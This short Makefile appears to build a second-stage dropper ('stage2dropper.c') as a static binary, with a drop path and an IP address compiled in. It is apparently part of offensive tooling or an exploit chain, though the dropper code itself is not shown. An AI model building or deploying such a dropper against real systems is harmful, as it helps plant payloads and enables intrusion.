ifdef STAGE2_DROP
	CFLAGS+=-DSTAGE2_DROP=\"$(STAGE2_DROP)\"
endif

ifdef IPADDRESS
	CFLAGS += -DIPADDRESS=\"$(IPADDRESS)\"
endif

all:stage2
	
stage2:
	$(CC) stage2dropper.c $(CFLAGS) -o stage2 -static